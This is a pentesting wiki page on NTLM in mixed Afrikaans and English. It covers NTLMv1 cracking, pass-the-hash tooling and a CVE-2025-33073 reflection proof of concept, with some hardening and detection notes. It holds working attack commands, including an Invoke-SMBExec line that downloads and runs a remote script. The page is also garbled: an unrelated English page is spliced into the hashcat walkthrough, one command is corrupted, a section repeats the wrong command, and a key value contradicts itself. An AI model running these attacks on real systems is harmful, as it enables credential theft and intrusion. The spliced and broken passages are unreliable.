# NTLM

{{#include ../../banners/hacktricks-training.md}}


## Basiese Inligting

In omgewings waar **Windows XP en Server 2003** in werking is, word LM (Lan Manager) hashes gebruik, alhoewel dit algemeen bekend is dat hierdie maklik gekompromitteer kan word. ’n Spesifieke LM hash, `AAD3B435B51404EEAAD3B435B51404EE`, dui op ’n scenario waar LM nie gebruik word nie, en verteenwoordig die hash vir ’n leë string.

By verstek is die **Kerberos** authentication protocol die primêre metode wat gebruik word. NTLM (NT LAN Manager) tree in onder spesifieke omstandighede op: afwesigheid van Active Directory, nie-bestaan van die domain, wanfunksionering van Kerberos weens verkeerde konfigurering, of wanneer connections probeer word met behulp van ’n IP address eerder as ’n geldige hostname.

Die teenwoordigheid van die **"NTLMSSP"** header in network packets dui op ’n NTLM authentication process.

Ondersteuning vir die authentication protocols - LM, NTLMv1, en NTLMv2 - word gefasiliteer deur ’n spesifieke DLL wat by `%windir%\Windows\System32\msv1\_0.dll` geleë is.

**Key Points**:

- LM hashes is vulnerable en ’n leë LM hash (`AAD3B435B51404EEAAD3B435B51404EE`) dui daarop dat dit nie gebruik word nie.
- Kerberos is die verstek authentication method, met NTLM wat slegs onder sekere omstandighede gebruik word.
- NTLM authentication packets kan geïdentifiseer word deur die "NTLMSSP" header.
- LM, NTLMv1, en NTLMv2 protocols word deur die system file `msv1\_0.dll` ondersteun.

## LM, NTLMv1 and NTLMv2

You can check and configure which protocol will be used:

### GUI

Execute _secpol.msc_ -> Local policies -> Security Options -> Network Security: LAN Manager authentication level. There are 6 levels (from 0 to 5).

![](<../../images/image (919).png>)

### Registry

This will set the level 5:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
Moglike waardes:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## Basic NTLM Domain authentication Scheme

1. Die **user** voer sy **credentials** in
2. Die client machine **stuur 'n authentication request** en stuur die **domain name** en die **username**
3. Die **server** stuur die **challenge**
4. Die **client encrypts** die **challenge** met die hash van die password as key en stuur dit as response
5. Die **server sends** aan die **Domain controller** die **domain name, the username, the challenge and the response**. As daar **nie** 'n Active Directory gekonfigureer is nie of die domain name is die naam van die server, word die credentials **lokaal nagegaan**.
6. Die **domain controller checks if everything is correct** en stuur die information na die server

Die **server** en die **Domain Controller** kan 'n **Secure Channel** skep via die **Netlogon** server aangesien die Domain Controller die password van die server ken (dit is binne die **NTDS.DIT** db).

### Local NTLM authentication Scheme

Die authentication is soos die een wat **voorheen** genoem is **maar** die **server** ken die **hash of the user** wat probeer authenticate binne die **SAM** file. Dus, in plaas daarvan om die Domain Controller te vra, sal die **server self check** of die user kan authenticate.

### NTLMv1 Challenge

Die **challenge length is 8 bytes** en die **response is 24 bytes** lank.

Die **hash NT (16bytes)** word in **3 parts of 7bytes each** verdeel (7B + 7B + (2B+0x00\*5)): die **last part is filled with zeros**. Dan word die **challenge** **apart ciphered** met elke part en die **resulting** ciphered bytes word **joined**. Total: 8B + 8B + 8B = 24Bytes.

**Problems**:

- Lack of **randomness**
- The 3 parts can be **attacked separately** to find the NT hash
- **DES is crackable**
- Die 3º key is composed always by **5 zeros**.
- Given the **same challenge** sal die **response** **same** wees. So, jy kan as **challenge** aan die victim die string "**1122334455667788**" gee en die response aanval met **precomputed rainbow tables**.

### NTLMv1 attack

Nowadays is becoming less common to find environments with Unconstrained Delegation configured, but this doesn't mean you can't **abuse a Print Spooler service** configured.

You could abuse some credentials/sessions you already have on the AD to **ask the printer to authenticate** against some **host under your control**. Then, using `metasploit auxiliary/server/capture/smb` or `responder` you can **set the authentication challenge to 1122334455667788**, capture the authentication attempt, and if it was done using **NTLMv1** you will be able to **crack it**.\
If you are using `responder` you could try to **use the flag `--lm`** to try to **downgrade** the **authentication**.\
_Note that for this technique the authentication must be performed using NTLMv1 (NTLMv2 is not valid)._

Remember that the printer will use the computer account during the authentication, and computer accounts use **long and random passwords** that you **probably won't be able to crack** using common **dictionaries**. But the **NTLMv1** authentication **uses DES** ([more info here](#ntlmv1-challenge)), so using some services specially dedicated to cracking DES you will be able to crack it (you could use [https://crack.sh/](https://crack.sh) or [https://ntlmv1.com/](https://ntlmv1.com) for example).

### NTLMv1 attack with hashcat

NTLMv1 can also be broken with the NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) which formats NTLMv1 messages im a method that can be broken with hashcat.

The command
```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
sou die onderstaande uitvoer:
```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
```md
# NTLM

NTLM (Windows NT LAN Manager) is an authentication protocol used in Windows environments. It is older than Kerberos and is still present for compatibility reasons.

## Why NTLM matters

NTLM can be abused in several ways during pentesting and post-exploitation, especially when password hashes or challenge-response exchanges can be captured or relayed.

Common abuse scenarios include:

- **Pass-the-Hash**: use a captured NTLM hash to authenticate without the plaintext password.
- **NTLM relay**: forward NTLM authentication from one system to another to gain unauthorized access.
- **Credential capture**: coerce a machine or user into authenticating to an attacker-controlled listener.

## Basic flow

NTLM typically works in a challenge-response flow:

1. The client requests authentication.
2. The server sends a challenge.
3. The client responds with a hash-based proof.
4. The server verifies the response.

## Hardening ideas

- Prefer Kerberos where possible.
- Restrict NTLM usage in the domain.
- Enable SMB signing where applicable.
- Use strong passwords and MFA.
- Monitor for suspicious authentication events and relay attempts.

## Detection notes

Watch for unusual authentication patterns, especially:

- repeated failed logons,
- unexpected outbound NTLM connections,
- authentication to unusual hosts,
- relay-like behavior between internal systems.

```
```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
Begin hashcat (versprei is die beste deur ’n instrument soos hashtopolis) aangesien dit andersins etlike dae sal neem.
```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
In hierdie geval weet ons die wagwoord hiervoor is password, so ons gaan kul vir demo-doeleindes:
```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
Ons moet nou die hashcat-utilities gebruik om die gekraakte des keys om te skakel na dele van die NTLM hash:
```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
Laastens die laaste deel:
```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
## NTLM Hardening

| Group Policy | Value |
|--------------|-------|
| Network security: Restrict NTLM: NTLM authentication in this domain | Deny all domain accounts |
| Network security: Restrict NTLM: Add remote server exceptions for NTLM authentication | List of server names |

**PowerShell**: Using the Group Policy Editor, set the value of **Network security: Restrict NTLM: NTLM authentication in this domain** to **Deny all domain accounts**.

The following PowerShell command can be used to set the relevant policy through the registry:

```powershell
reg add HKLM\System\CurrentControlSet\Control\Lsa\MSV1_0 /v RestrictReceivingNTLMTraffic /t REG_DWORD /d 2 /f
```

## Disable LM and NTLMv1

LM and NTLMv1 are weak and should be disabled.

### Group Policy

| Group Policy | Value |
|--------------|-------|
| Network security: LAN Manager authentication level | Send NTLMv2 response only. Refuse LM & NTLM |
| Network security: Minimum session security for NTLM SSP based (including secure RPC) clients | Require NTLMv2 session security |
| Network security: Minimum session security for NTLM SSP based (including secure RPC) servers | Require NTLMv2 session security |

### PowerShell

```powershell
reg add HKLM\System\CurrentControlSet\Control\Lsa /v LMCompatibilityLevel /t REG_DWORD /d 5 /f
```

## NTLM relay protections

### SMB signing

Enable SMB signing to prevent NTLM relay attacks over SMB.

### LDAP signing and channel binding

Enable LDAP signing and channel binding to protect against LDAP relay.

### EPA

Use Extended Protection for Authentication (EPA) where supported.

## Credential protections

- Use `Credential Guard` to isolate credentials.
- Use `Restricted Admin` mode for remote administration when possible.
- Avoid storing reusable local administrator passwords.

## Detection

- Monitor for NTLM usage.
- Look for unexpected NTLM authentication to sensitive systems.
- Alert on relay patterns and authentication from unusual hosts.
```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### NTLMv2 Challenge

Die **challenge length is 8 bytes** en **2 responses are sent**: Een is **24 bytes** lank en die lengte van die **ander** is **variable**.

**The first response** word geskep deur te enkripteer met **HMAC_MD5** die **string** saamgestel deur die **client and the domain** en as **key** te gebruik die **hash MD4** van die **NT hash**. Dan sal die **result** gebruik word as **key** om met **HMAC_MD5** die **challenge** te enkripteer. Hierby sal **a client challenge of 8 bytes** bygevoeg word. Total: 24 B.

**The second response** word geskep met **several values** (a new client challenge, a **timestamp** to avoid **replay attacks**...)

As jy ’n **pcap** het wat ’n suksesvolle authentication process vasgelê het, kan jy hierdie guide volg om die domain, username , challenge en response te kry en die password te probeer kraak: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)

## Pass-the-Hash

**Once you have the hash of the victim**, kan jy dit gebruik om dit te **impersonate**.\
Jy moet ’n **tool** gebruik wat die **NTLM authentication using** daardie **hash** sal uitvoer, **or** jy kan ’n nuwe **sessionlogon** skep en daardie **hash** in die **LSASS** insit, sodat wanneer enige **NTLM authentication is performed**, daardie **hash will be used.** Die laaste opsie is wat mimikatz doen.

**Please, remember that you can perform Pass-the-Hash attacks also using Computer accounts.**

### **Mimikatz**

**Needs to be run as administrator**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
This sal 'n proses laat loop wat aan die gebruikers sal behoort wat mimikatz geloods het, maar intern in LSASS is die gestoorde credentials die wat binne die mimikatz parameters is. Dan kan jy toegang kry tot network resources asof jy daardie user was (soortgelyk aan die `runas /netonly` trick, maar jy hoef nie die plain-text password te ken nie).

### Pass-the-Hash from linux

Jy kan code execution op Windows machines verkry met behulp van Pass-the-Hash vanaf Linux.\
[**Access here to learn how to do it.**](https://github.com/carlospolop/hacktricks/blob/master/windows/ntlm/broken-reference/README.md)

### Impacket Windows compiled tools

Jy kan [impacket binaries for Windows hier aflaai](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).

- **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
- **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
- **atexec.exe** (In this case you need to specify a command, cmd.exe and powershell.exe are not valid to obtain an interactive shell)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
- There are several more Impacket binaries...

### Invoke-TheHash

Jy kan die powershell scripts van hier af kry: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

#### Invoke-SMBExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient
```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum
```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

Hierdie funksie is ’n **mengsel van al die ander**. Jy kan **verskeie hosts** deurgee, sommige **uitsluit** en die **opsie** kies wat jy wil gebruik (_SMBExec, WMIExec, SMBClient, SMBEnum_). As jy **enige** van **SMBExec** en **WMIExec** kies maar jy **gee nie** enige _**Command**_ parameter nie, sal dit net **kontroleer** of jy **genoeg permissions** het.
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**Moet as administrateur uitgevoer word**

Hierdie instrument sal dieselfde ding doen as mimikatz (wysig LSASS-geheue).
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### Handmatige Windows-afstanduitvoering met gebruikernaam en wagwoord


{{#ref}}
../lateral-movement/
{{#endref}}

## Onttrek geloofsbriewe van 'n Windows-host

**Vir meer inligting oor** [**hoe om geloofsbriewe van 'n Windows-host te verkry, moet jy hierdie bladsy lees**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/ntlm/broken-reference/README.md)**.**

## Internal Monologue-aanval

Die Internal Monologue-aanval is 'n stealthy tegniek vir die onttrekking van geloofsbriewe wat 'n aanvaller toelaat om NTLM hashes van 'n slagoffer se masjien af te haal **sonder om direk met die LSASS-proses te interaksieer nie**. Anders as Mimikatz, wat hashes direk uit geheue lees en dikwels deur endpoint security solutions of Credential Guard geblokkeer word, gebruik hierdie aanval **plaaslike oproepe na die NTLM-authentication package (MSV1_0) via die Security Support Provider Interface (SSPI)**. Die aanvaller **verlaag eers NTLM-instellings** (bv. LMCompatibilityLevel, NTLMMinClientSec, RestrictSendingNTLMTraffic) om seker te maak dat NetNTLMv1 toegelaat word. Hulle boots dan bestaande user tokens na wat uit lopende prosesse verkry is en aktiveer NTLM-authentication plaaslik om NetNTLMv1 responses te genereer met 'n bekende challenge.

Nadat hierdie NetNTLMv1 responses vasgelê is, kan die aanvaller vinnig die oorspronklike NTLM hashes herstel met **precomputed rainbow tables**, wat verdere Pass-the-Hash-aanvalle vir lateral movement moontlik maak. Belangrik, die Internal Monologue-aanval bly stealthy omdat dit geen netwerkverkeer genereer nie, geen code inject nie, en geen direkte geheue-dumps aktiveer nie, wat dit moeiliker maak vir defenders om dit te ontdek in vergelyking met tradisionele metodes soos Mimikatz.

As NetNTLMv1 nie aanvaar word nie—weens afgedwingde security policies, dan kan die aanvaller dalk nie 'n NetNTLMv1 response verkry nie.

Om hierdie geval te hanteer, is die Internal Monologue tool opgedateer: Dit verkry dinamies 'n server token met `AcceptSecurityContext()` om steeds **NetNTLMv2 responses vas te vang** as NetNTLMv1 faal. Alhoewel NetNTLMv2 baie moeiliker is om te crack, open dit steeds 'n pad vir relay attacks of offline brute-force in beperkte gevalle.

Die PoC kan gevind word in **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)**.

## NTLM Relay en Responder

**Lees hier meer gedetailleerde gids oor hoe om daardie aanvalle uit te voer:**


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## Parse NTLM challenges uit 'n netwerk capture

**Jy kan gebruik** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

## NTLM & Kerberos *Reflection* via Serialized SPNs (CVE-2025-33073)

Windows bevat verskeie mitigations wat probeer om *reflection* attacks te voorkom waar 'n NTLM (of Kerberos)-authentication wat vanaf 'n host oorsprong het, terug na dieselfde host gerelay word om SYSTEM privileges te verkry.

Microsoft het die meeste public chains gebreek met MS08-068 (SMB→SMB), MS09-013 (HTTP→SMB), MS15-076 (DCOM→DCOM) en latere patches, maar **CVE-2025-33073** wys dat die protections steeds omseil kan word deur misbruik te maak van hoe die **SMB client Service Principal Names (SPNs)** wat *marshalled* (serialized) target-info bevat, afkap.

### TL;DR van die bug
1. 'n Aanvaller registreer 'n **DNS A-record** wie se label 'n marshalled SPN kodeer – bv.
`srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
2. Die slagoffer word gedwing om by daardie hostname te authenticatie (PetitPotam, DFSCoerce, ens.).
3. Wanneer die SMB client die target string `cifs/srv11UWhRCAAAAA…` na `lsasrv!LsapCheckMarshalledTargetInfo` deurgee, **stroop** die oproep na `CredUnmarshalTargetInfo` die serialized blob, en laat **`cifs/srv1`** agter.
4. `msv1_0!SspIsTargetLocalhost` (of die Kerberos-ekwivalent) beskou nou die target as *localhost* omdat die kort host-deel ooreenstem met die computer name (`SRV1`).
5. Gevolglik stel die server `NTLMSSP_NEGOTIATE_LOCAL_CALL` en spuit **LSASS’ SYSTEM access-token** in die context in (vir Kerberos word 'n SYSTEM-gemerkte subsession key geskep).
6. Deur daardie authentication met `ntlmrelayx.py` **of** `krbrelayx.py` te relay gee volle SYSTEM rights op dieselfde host.

### Quick PoC
```bash
# Add malicious DNS record
dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
-a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
-d 10.10.10.50

# Trigger authentication
PetitPotam.py -u user -p pass -d DOMAIN \
srv11UWhRCAAAAAAAAAAAAAAAAA… TARGET.DOMAIN.LOCAL

# Relay listener (NTLM)
ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support

# Relay listener (Kerberos) – remove NTLM mechType first
krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
```
### Patch & Mitigations
* KB patch for **CVE-2025-33073** voeg 'n check in `mrxsmb.sys::SmbCeCreateSrvCall` by wat enige SMB connection blokkeer wie se target marshalled info bevat (`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`).
* Enforce **SMB signing** om reflection selfs op unpatched hosts te voorkom.
* Monitor DNS records wat lyk soos `*<base64>...*` en blok coercion vectors (PetitPotam, DFSCoerce, AuthIP...).

### Detection ideas
* Network captures met `NTLMSSP_NEGOTIATE_LOCAL_CALL` waar client IP ≠ server IP.
* Kerberos AP-REQ wat 'n subsession key bevat en 'n client principal wat gelyk is aan die hostname.
* Windows Event 4624/4648 SYSTEM logons wat onmiddellik gevolg word deur remote SMB writes vanaf dieselfde host.

For the **March 2026** local reflection variant that abuses **SMB arbitrary ports** and **TCP connection reuse** to reach `NT AUTHORITY\SYSTEM`, see:

{{#ref}}
../windows-local-privilege-escalation/local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## References
* [NTLM Reflection is Dead, Long Live NTLM Reflection!](https://www.synacktiv.com/en/publications/la-reflexion-ntlm-est-morte-vive-la-reflexion-ntlm-analyse-approfondie-de-la-cve-2025.html)
* [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)

{{#include ../../banners/hacktricks-training.md}}
